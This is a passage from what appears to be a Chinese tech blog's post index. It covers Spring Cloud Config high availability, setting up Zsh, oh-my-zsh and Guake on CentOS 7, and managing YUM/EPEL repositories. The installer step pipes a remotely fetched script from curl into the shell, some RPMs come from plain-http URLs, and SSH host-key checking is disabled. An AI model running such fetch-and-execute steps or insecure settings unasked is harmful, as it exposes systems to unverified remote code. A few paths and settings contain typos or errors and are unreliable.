的思路大体一致。客户端高可用主要是解决当服务端不可用的情况下，客户端依然可以正常启动。从客户端的角度出发，不是增加配置中心的高可用性，而是降低客户端对配置中心的依赖程度，从而提高整个分布式架构的健壮性。客户端加载配置的高可用流程图如下，点击下载完整的案例代码。 1. 准备工作由于下面的 Spring Cloud Config 使用 Git 作为存储方式，因此需要提前在 Git 远程仓库（Github、Gitlab）中创建对应的仓库，然后往仓库里 Push 三个配置文件，分别是 config-client-dev.yml、config-client-prod.yml、config-client-test.yml，配置文件的内容如下： 123456server: port: 9001cn: springcloud: config: I am the git configuration file from dev environment 123456server: port: 9002cn: springcloud: config: I am the git configuration file from prod environment 123456server: port: 9003cn: springcloud: config: I am the git configuration file from test environment 2. 创建 Config Client HA AutoConfig 工程创建 Config Client HA AutoConfig 工程，配置工程里的 pom.xml 文件： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Client HA AutoConfig 工程里的配置属性加载类： 123456789101112131415161718192021222324252627282930@Component@ConfigurationProperties(prefix = ConfigSupportProperties.CONFIG_PREFIX)public class ConfigSupportProperties { public static final String CONFIG_PREFIX = "spring.cloud.config.backup"; private final String DEFAULT_FILE_NAME = "fallback.properties"; private boolean enable = false; private String fallbackLocation; public boolean isEnable() { return enable; } public void setEnable(boolean enable) { this.enable = enable; } public String getFallbackLocation() { return fallbackLocation; } public void setFallbackLocation(String fallbackLocation) { // 如果只是填写路径， 就添加上一个默认的文件名 if (fallbackLocation.indexOf(".") == -1) { this.fallbackLocation = fallbackLocation + DEFAULT_FILE_NAME; return; } this.fallbackLocation = fallbackLocation; }} 创建 Config Client HA AutoConfig 工程里的自动配置类，该类主要的作用是判断 Config Server 端的配置信息是否可用，如果不能用将读取加载本地备份配置文件进行启动。需要注意的是启动顺序的设置，这是因为 Spring Cloud 使用的 PropertySourceBootstrapConfiguration 启动顺序为 private int order = -2147483638，order 的值越小越先加载，所以下述的 orderNum 只要加上一个整数比其大即可： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185@Configuration@EnableConfigurationProperties(ConfigSupportProperties.class)public class ConfigSupportConfiguration implements ApplicationContextInitializer&lt;ConfigurableApplicationContext&gt;, Ordered { private final Logger LOGGER = LoggerFactory.getLogger(ConfigSupportConfiguration.class); private final Integer orderNum = Ordered.HIGHEST_PRECEDENCE + 11; @Autowired(required = false) private List&lt;PropertySourceLocator&gt; propertySourceLocators = Collections.EMPTY_LIST; @Autowired private ConfigSupportProperties configSupportProperties; @Override public void initialize(ConfigurableApplicationContext configurableApplicationContext) { if (!isHasCloudConfigLocator(this.propertySourceLocators)) { LOGGER.info("未启用Config Server管理配置"); return; } LOGGER.info("检查Config Service配置资源"); ConfigurableEnvironment environment = configurableApplicationContext.getEnvironment(); MutablePropertySources propertySources = environment.getPropertySources(); LOGGER.info("加载PropertySources源：" + propertySources.size() + "个"); if (!configSupportProperties.isEnable()) { LOGGER.warn("未启用配置备份功能，可使用{}.enable打开", ConfigSupportProperties.CONFIG_PREFIX); return; } if (isCloudConfigLoaded(propertySources)) { PropertySource cloudConfigSource = getLoadedCloudPropertySource(propertySources); LOGGER.info("成功获取ConfigService配置资源"); Map&lt;String, Object&gt; backupPropertyMap = makeBackupPropertyMap(cloudConfigSource); doBackup(backupPropertyMap, configSupportProperties.getFallbackLocation()); LOGGER.info("成功备份ConfigService配置资源"); } else { LOGGER.error("获取ConfigService配置资源失败"); Properties backupProperty = loadBackupProperty(configSupportProperties.getFallbackLocation()); if (backupProperty != null) { HashMap backupSourceMap = new HashMap&lt;&gt;(backupProperty); PropertySource backupSource = new MapPropertySource("backupSource", backupSourceMap); propertySources.addFirst(backupSource); LOGGER.warn("使用备份的配置启动：{}", configSupportProperties.getFallbackLocation()); } } } @Override public int getOrder() { return orderNum; } /** * 是否启用了Spring Cloud Config获取配置资源 * * @param propertySourceLocators * @return */ private boolean isHasCloudConfigLocator(List&lt;PropertySourceLocator&gt; propertySourceLocators) { for (PropertySourceLocator sourceLocator : propertySourceLocators) { if (sourceLocator instanceof ConfigServicePropertySourceLocator) { return true; } } return false; } /** * 是否启用Cloud Config * * @param propertySources * @return */ private boolean isCloudConfigLoaded(MutablePropertySources propertySources) { if (getLoadedCloudPropertySource(propertySources) == null) { return false; } return true; } /** * 获取加载的Cloud Config配置项 * * @param propertySources * @return */ private PropertySource getLoadedCloudPropertySource(MutablePropertySources propertySources) { if (!propertySources.contains(PropertySourceBootstrapConfiguration.BOOTSTRAP_PROPERTY_SOURCE_NAME)) { return null; } PropertySource propertySource = propertySources.get(PropertySourceBootstrapConfiguration.BOOTSTRAP_PROPERTY_SOURCE_NAME); if (propertySource instanceof CompositePropertySource) { for (PropertySource&lt;?&gt; source : ((CompositePropertySource) propertySource).getPropertySources()) { if (source.getName().equals("configService")) { return source; } } } return null; } /** * 生成备份的配置数据 * * @param propertySource * @return */ private Map&lt;String, Object&gt; makeBackupPropertyMap(PropertySource propertySource) { Map&lt;String, Object&gt; backupSourceMap = new HashMap&lt;&gt;(); if (propertySource instanceof CompositePropertySource) { CompositePropertySource composite = (CompositePropertySource) propertySource; for (PropertySource&lt;?&gt; source : composite.getPropertySources()) { if (source instanceof MapPropertySource) { MapPropertySource mapSource = (MapPropertySource) source; for (String propertyName : mapSource.getPropertyNames()) { // 前面的配置覆盖后面的配置 if (!backupSourceMap.containsKey(propertyName)) { backupSourceMap.put(propertyName, mapSource.getProperty(propertyName)); } } } } } return backupSourceMap; } /** * 生成备份文件 * * @param backupPropertyMap * @param filePath */ private void doBackup(Map&lt;String, Object&gt; backupPropertyMap, String filePath) { FileSystemResource fileSystemResource = new FileSystemResource(filePath); File backupFile = fileSystemResource.getFile(); try { if (!backupFile.exists()) { backupFile.createNewFile(); } if (!backupFile.canWrite()) { LOGGER.error("无法读写文件：{}", fileSystemResource.getPath()); } Properties properties = new Properties(); Iterator&lt;String&gt; keyIterator = backupPropertyMap.keySet().iterator(); while (keyIterator.hasNext()) { String key = keyIterator.next(); properties.setProperty(key, String.valueOf(backupPropertyMap.get(key))); } FileOutputStream fos = new FileOutputStream(fileSystemResource.getFile()); properties.store(fos, "Backup Cloud Config"); } catch (IOException e) { LOGGER.error("文件操作失败：{}", fileSystemResource.getPath()); e.printStackTrace(); } } /** * 加载本地文件 * * @param filePath * @return */ private Properties loadBackupProperty(String filePath) { PropertiesFactoryBean propertiesFactory = new PropertiesFactoryBean(); Properties props = new Properties(); try { FileSystemResource fileSystemResource = new FileSystemResource(filePath); propertiesFactory.setLocation(fileSystemResource); propertiesFactory.afterPropertiesSet(); props = propertiesFactory.getObject(); } catch (IOException e) { e.printStackTrace(); return null; } return props; }} 创建 Config Client HA AutoConfig 工程里 /src/main/resources/META-INF/spring.factories 配置文件，添加上面的自动配置类： 12org.springframework.cloud.bootstrap.BootstrapConfiguration=\\com.springcloud.study.config.ConfigSupportConfiguration 3. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入上面的 config-client-ha-autoconfig： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-client-ha-autoconfig&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; 创建 Config Client 的主启动类： 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息： 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中： 123spring: application: name: config-client 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中，enable 表示是否启动加载远程配置信息进行本地备份，fallbackLocation 表示本地备份的路径，也可以是路径加上文件名： 12345678910spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 backup: enable: true fallbackLocation: /tmp/config/config-client-dev/fallback.properties #备份配置文件的路径 4. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-config-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类，增加 @EnableConfigServer 注解： 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 添加 Config Server 需要的 application.yml 配置文件到工程中： 123456789101112131415server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: master 5. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo 后观察返回的配置信息，与此同时查看是否在目录 /tmp/config/config-client-dev/ 下成功创建了备份文件 fallback.properties 关闭 config-server、config-client 应用，然后单独启动 config-client 应用；观察在不启动 config-server 的情况下，config-client 应用是否能正常启动 若 config-client 应用单独启动成功，config-client 应用会先尝试去连接 config-server，当连接失败后，会加载本地的备份文件，此时控制台输出的日志信息如下： 1234567c.c.c.ConfigServicePropertySourceLocator : Fetching config from server at : http://127.0.0.1:8001c.c.c.ConfigServicePropertySourceLocator : Connect Timeout Exception on Url - http://127.0.0.1:8001. Will be trying the next url if availablec.c.c.ConfigServicePropertySourceLocator : Could not locate PropertySource: I/O error on GET request for "http://127.0.0.1:8001/config-client/dev/master": 拒绝连接; nested exception is java.net.ConnectException: 拒绝连接c.s.s.config.ConfigSupportConfiguration : 检查Config Service配置资源c.s.s.config.ConfigSupportConfiguration : 加载PropertySources源：10个c.s.s.config.ConfigSupportConfiguration : 获取ConfigService配置资源失败c.s.s.config.ConfigSupportConfiguration : 使用备份的配置启动：/tmp/config/config-client-dev/fallback.properties Config 服务端高可用Config Server 一样需要在生成环境下保证高可用的，这里将通过结合 Eureka 注册中心的方式搭建 Config Server 的高可用，即通过 Ribbon 的客户端负载均衡选择一个 Config Server 进行连接来获取配置信息，具体的流程如下，点击下载完整的案例代码。对于 Eureka 的高可用这里也不进行详解，详细关于 Eureka 的高可用可参考 Eureka 集群配置。 1. 准备说明本示例用到上面的 “客户端高可用” 示例中 Git 仓库里的配置文件，包括 config-client-dev.yml、config-client-prod.yml、config-client-test.yml。 2. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，引入 spring-cloud-starter-netflix-eureka-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@EnableEurekaServer@SpringBootApplicationpublic class EurekaServerApplication { public static void main(String[] args) { SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程的 src/main/resources 目录下： 1234567891011server: port: 7001eureka: instance: hostname: localhost #Eureka服务端的实例名称 client: register-with-eureka: false #false表示不向注册中心注册自己 fetch-registry: false #false表示自己就是注册中心，职责就是维护服务实例，并不需要去检索服务 service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 3. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件，由于 Config Sever 需要注册到 Eureka Server，所以需要另外添加 Eureka Client 的依赖： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类，增加 @EnableConfigServer、@EnableDiscoveryClient 注解： 123456789@EnableConfigServer@EnableDiscoveryClient@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 添加 Config Server 需要的 application.yml 配置文件到工程中： 1234567891011121314151617181920212223server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: mastereureka: client: service-url: defaultZone: http://localhost:7001/eureka instance: instance-id: ${spring.application.name}-${server.port} #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名 4. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，由于 Config Client 需要注册到 Eureka Server，所以需要另外添加 Eureka Client 的依赖： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Client 的主启动类，增加 @EnableDiscoveryClient 注解： 123456789@EnableDiscoveryClient@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息： 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中： 123spring: application: name: config-client 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中，这里不再使用 spring.cloud.config.uri 参数直接指向 Config Server 端的连接地址，而是增加了下述三个参数： spring.cloud.config.discovery.enabled：开启 Config Client 的服务发现支持 spring.cloud.config.discovery.service-id：指定 Config Server 端的 serviceId，也就是 Config Server 端的 spring.application.name 参数值 eureka.client.service-url.defaultZone： 指向 Eureka 注册中心的地址 1234567891011121314151617spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 discovery: enabled: true service-id: config-servereureka: client: service-url: defaultZone: http://localhost:7001/eureka instance: instance-id: config-client-${server.port} #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名 5. 测试 通过 maven install 命令将各个应用安装到本地，然后再使用命令行启动各个应用，当然也可以直接在 IDEA、Eclipse 里启动，具体的命令如下： 1234567891011121314# 启动Eurekajava -jar eureka-server-1.0-SNAPSHOT.jar# 启动Config Server（默认端口：8001）java -jar config-server-1.0-SNAPSHOT.jar# 启动Config Serverjava -jar config-server-1.0-SNAPSHOT.jar --server.port=8002# 启动Config Config（默认端口：9001）java -jar config-client-1.0-SNAPSHOT.jar# 启动Config Configjava -jar config-client-1.0-SNAPSHOT.jar --server.port=9002 当两个 Config Client 应用启动完成后，查看控制台输出的日志信息，看看是否已经负载了；如果没有负载到也没关系，可以启动多个 Config Client 实例再试试 浏览器访问 http://127.0.0.1:9001/getConfigInfo、http://127.0.0.1:9002/getConfigInfo，观察是否可以正确返回配置信息 Config 源码解析（待续） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Centos7 安装 Zsh 与 Guake",url:"/posts/f83b3bd2.html",text:'Zsh 介绍 Shell 是在开发人员与服务器间建立一个桥梁，它对外提供一系列命令，让我们得以控制服务器。常用的 Bash 就是 Shell 的一种，也是 Linux 下默认 Shell 程序。Zsh 属于 Shell 中的一种，但比 Bash 好用，而且完全兼容 Bash，拥有及其丰富的插件、强大的命令自动补全能力、以及自定义功能，可以大大提供使用 Linux 的效率。 Zsh 安装 12345678# 安装依赖# yum install git curl wget# 查看是否存在zsh# cat /etc/shells# 如果zsh不存在，则安装zsh# yum install zsh 本地 Shell 切换到 Zsh 1234567891011121314151617# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 查看当前shell# echo $SHELL# 切换shell到zsh# chsh -s /bin/zsh# 重启系统# reboot# 查看当前shell是否切换成功# echo $SHELL# 默认的zsh配置文件（自动生成）：~/.zshrc# 提示：切换到zsh后，以前在bash shell里添加的环境变量(~/.bashrc)可能会失效，此时需要在zsh的配置文件(~/.zshrc)中重新添加相关环境变量 解决切换到 Zsh 导致 Fcitx + 搜狗输入法无法使用的问题 123456789101112131415161718192021# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 更改zsh的配置文件，添加fcitx相关的环境变量（不同的Linux用户需要单独配置）# vim ~/.zshrcexport XIM=fcitxexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport QT4_IM_MODULE=fcitxexport XMODIFIERS="@im=fcitx"# 设置GNOME的注册表（或者使用dconf-editor可视化工具来设置注册表）# gsettings set org.gnome.settings-daemon.plugins.xsettings overrides "{\'Gtk/IMModule\':&lt;\'fcitx\'&gt;}"# 重启系统# reboot# 如果上述方法都无法解决，那么可查看fcitx的错误日志信息来排查问题# cat ~/.config/fcitx/log/crash.log# 或者查看fcitx的安装状态，重点查看红色部分（错误）的日志信息# fcitx-diagnose Zsh 的一些骚气操作 123456789101. 连按两次 Tab 会列出所有的补全列表并直接开始选择，补全项可以使用 ctrl+n/p/f/b 上下左右切换2. 命令选项补全：在 zsh 中只需要键入 tar -&lt;tab&gt; 就会列出所有的选项和帮助说明3. 命令参数补全：键入 kill &lt;tab&gt; 就会列出所有的进程名和对应的进程号4. 更智能的历史命令：在用或者方向上键查找历史命令时，zsh 支持限制查找。比如，输入 ls，然后再按方向上键，则只会查找用过的 ls 命令。而此时使用则会仍然按之前的方式查找，忽略 ls5. 多个终端会话共享历史记录6. 智能跳转：安装了 autojump 之后，zsh 会自动记录你访问过的目录，通过 j 目录名 可以直接进行目录跳转，而且目录名支持模糊匹配和自动补全，例如你访问过 hadoop-1.0.0 目录，输入 j hado 即可正确跳转，输入 j --stat 可以看你的历史路径库7. 目录浏览和跳转：输入 d，即可列出你在这个会话里访问的目录列表，输入列表前的序号，即可直接跳转8. 在当前目录下输入 .. 或 ... ，或直接输入当前目录名都可以跳转，你甚至不再需要输入 cd 命令了。在你知道路径的情况下，比如 /usr/local/bin 你可以输入 cd /u/l/b 然后按进行补全快速输入9. 通配符搜索：ls -l **/*.sh，可以递归显示当前目录下的 shell 文件，文件少时可以代替 find，文件多的时候不建议使用10. 在 ~/.zshrc 中添加 setopt HIST_IGNORE_DUPS 可以消除重复记录，也可以利用 sort -t ";" -k 2 -u ~/.zsh_history | sort -o ~/.zsh_history 手动清除 oh-my-zsh 安装 Zsh 虽然炫酷，但是炫酷的背后是复杂的配置，有较高的使用门槛。oh-my-zsh 是一群开源爱好者一起维护的一套 Zsh 配置文件，专门为 Zsh 打造，简化了 Zsh 的使用细节。 1234567891011121314# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 安装oh-my-zsh# sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"# 安装oh-my-zsh后，如果执行命令时提示：warning:cannot set LC_CTYPE locale，添加以下环境变量即可# vim ~/.zshrcexport LC_ALL=en_US.UTF-8export LC_CTYPE=en_US.UTF-8# 使环境变量生效# source ~/.zshrc# 默认安装位置：~/.oh-my-zsh (adsbygoogle = window.adsbygoogle || []).push({}); oh-my-zsh 使用 agnoster 主题 oh-my-zsh 各种主题的显示效果可以点击这里查看。 123456789101112131415161718# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 安装powerline字体# git clone https://github.com/powerline/fonts.git --depth=1# ./fonts/install.sh# rm -rf fonts# 验证powerline字体是否安装成功# echo "\\ue0b0 \\u00b1 \\ue0a0 \\u27a6 \\u2718 \\u26a1 \\u2699"# 更改zsh的主题，如果将值设为空，表示不使用任何主题，也可以设置为"random"，每次打开终端都会随机选择一种主题# vim ~/.zshrcZSH_THEME="agnoster"# 使配置生效# source ~/.zshrc# 字体powerline的安装路径：~/.local/share/fonts oh-my-zsh 安装自定义插件 oh-my-zsh 提供了完善的插件体系，相关的插件文件在 /.oh-my-zsh/plugins 目录下，默认提供了 100 多种插件，可以根据自己的实际学习和工作环境选择性采用。oh-my-zsh 的插件也是在 /.zshrc 里配置，找到 plugins 关键字，添加自己的插件即可，也可以采用以下的方法安装自定义的插件，系统默认加载了 git 插件。最后，虽然 oh-my-zsh 提供了很多插件，不过也不要贪多，加载大量的插件会拖慢 oh-my-zsh 的运行速度，因此建议按自己的实际需求加载插件。 12345678910111213141516171819# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 安装自动提示插件# git clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions# 安装语法高亮插件# git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting# 文件授权# chmod -R 755 ~/.oh-my-zsh/custom/plugins# 启用插件# vim ~/.zshrcplugins=(git zsh-autosuggestions zsh-syntax-highlighting)# 使配置生效# source ~/.zshrc# 自定义插件的安装路径：~/.oh-my-zsh/custom/plugins oh-my-zsh 安装 autojump 插件 autojump 是一个命令行工具，它可以使用快捷命令直接跳转到预配置好或者曾经进入过的目录，而不用管当前处在哪个目录下；默认是通过记录目录路径到本地文件或者数据库来实现，所以必须是预配置好或者曾经进入过的目录才能跳转。类似的命令行工具还有 z.lua。 1234567891011121314# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 安装# yum instal autojump autojump-zsh# 启用插件# vim ~/.zshrcplugins=(git zsh-autosuggestions zsh-syntax-highlighting autojump)# 使配置生效# source ~/.zshrc# 查看是否运行正常# j --stat ZSH 隐藏命令行前面的用户名和主机名 1234567891011121314151617181920212223242526272829# 以下操作，不同的Linux用户需要单独安装或者配置（YUM操作除外）# 修改ZSH的配置文件，在文件末尾追加以下内容（下面四种方式任意选一种即可）# vim ~/.zshrc# 第一种方式：隐藏用户名和主机名prompt_context() {}# 第二种方式：使用任意自定义字符串作为用户名和主机名prompt_context() { prompt_segment black default "xxxx"}# 第三种方式：只保留用户名，隐藏主机名prompt_context() { if [[ "$USER" != "$DEFAULT_USER" || -n "$SSH_CLIENT" ]]; then prompt_segment black default "%(!.%{%F{yellow}%}.)$USER" fi}# 第四种方式：只保留主机名，隐藏用户名prompt_context() { if [[ "$USER" != "$DEFAULT_USER" || -n "$SSH_CLIENT" ]]; then prompt_segment black default "%(!.%{%F{yellow}%}.)$HOST" fi}# 使配置生效# source ~/.zshrc 解决 oh-my-zsh + git 响应慢 / 卡顿的问题 12345678# 进入git项目的根目录# cd git-project# 设置不读取文件变化信息# git config --add oh-my-zsh.hide-dirty 1# 或者不读取任何git信息（速度更快）# git config --add oh-my-zsh.hide-status 1 解决切换主题后，终端显示乱码的问题 1231. 运行终端2. 导航到菜单栏 --&gt; 编辑 --&gt; 首选项 --&gt; 文本 --&gt; 自定义字体，选择powerline字体，否则agnoster主题的箭头会显示乱码3. 导航到菜单栏 --&gt; 编辑 --&gt; 首选项 --&gt; 颜色 --&gt; 调色板，选择内置方案，更改终端的不同显示样式（可选操作） Guake 安装 Guake 是一个下拉式的 GNOME 桌面环境下的终端程序，只需要按一个键就可以调用出终端界面，失去焦点后会自动隐藏掉。当有些时候需要临时执行一两个命令，但是又不想额外启动一个终端的情况下，Guake 是个不错的选择。Guake 还支持快捷键、标签、背景透明、背景图片等特性。 123456789# 安装guake# yum install guake# 导航到应用程序 --&gt; 系统工具 --&gt; Guake Terminal，点击即可启动Guake；或者按下F12即可调出Guake，再次按下F12即可隐藏掉# 配置guake$ guake-prefs# 提示：Guake完美支持oh-my-zsh，具体配置方法与上面给出的终端配置（解决终端显示乱码）大致相同 oh-my-zsh 最终运行效果图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Centos7 管理 YUM 源与 EPEL 源",url:"/posts/4688dc15.html",text:'YUM 相关的配置文件及目录 123主配置文件：/etc/yum.conf资源库配置目录：/etc/yum.repos.d重要文件： /etc/yum.repos.d/CentOS-Base.repo YUM 安装加速插件 12345678910111213# 安装axelget插件# yum install axel yum-plugin-fastestmirror yum-axelget# 如果临时不想启用axelget插件，可参考以下命令# yum --disableplugin=axelget YumCommand# 更改axelget插件默认的并发下载线程数，编辑Python源码文件，修改以下内容即可# vim /usr/lib/yum-plugins/axelget.pymaxconn = 15maxconn = conduit.confInt(\'main\', \'maxconn\', default=15)# 查看实际并发下载的效果# yum --debuglevel=3 YumCommand 添加常用的 YUM 源 1234567891011121314151617181920# 添加epel源# yum install epel-release# 添加nux-dextop源# rpm -Uvh http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpm# 添加rpmfusion free源# yum localinstall http://download1.rpmfusion.org/free/el/rpmfusion-free-release-7.noarch.rpm# 添加rpmfusion nonfree源（闭源软件的源，不建议使用）# yum localinstall http://download1.rpmfusion.org/nonfree/el/rpmfusion-nonfree-release-7.noarch.rpm# 清理数据源# yum clean all# 重建数据源# yum makecache# 查看已安装的源# yum repolist 配置 YUM 源为阿里云镜像源 1234567891011121314151617# 备份YUM源# mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak# 下载阿里云的YUM源# wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo# 或者# curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo# 清理数据源# yum clean all# 重建数据源# yum makecache# 查看已安装的源# yum repolist 配置 EPEL 源为阿里云镜像源 12345678910111213141516171819# 备份EPEL源# cp /etc/yum.repos.d/epel-7.repo /etc/yum.repos.d/epel-7.repo.bak# 下载阿里云的EPEL源# wget -O /etc/yum.repos.d/epel-7.repo https://mirrors.aliyun.com/repo/epel-7.repo# 或者# curl -o /etc/yum.repos.d/epel-7.repo https://mirrors.aliyun.com/repo/epel-7.repo# 清理数据源# yum clean all# 重建数据源# yum makecache# 查看已安装的源# yum repolist# 提示:配置EPEL源为阿里云镜像源后,依然可以正常使用"yum install epel-release"命令安装EPEL源 Centos7 卸载 EPEL 源 12345678910111213141516171819# 查找epel已安装的rpm包# rpm -qa | grep epel# 卸载epel已安装的rpm包# yum remove epel-release-7-11.noarch# 确保epel相关文件已删除# rm /etc/yum.repos.d/epel.repo# rm /etc/yum.repos.depel-testing.repo# rm /etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7# 清理数据源# yum clean all# 重建数据源# yum makecache# 查看已安装的源# yum repolist 禁用 YUM 源 1234567891011121314# 查看所有仓库源# yum repolist all# 查看所有已启用的仓库源# yum repolist# 更新软件，并临时禁用某个仓库源# yum --disablerepo=Atom update -y# 永久启用某个仓库源# yum-config-manager --enable Atom# 永久禁用某个仓库源# yum-config-manager --disable Atom var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": 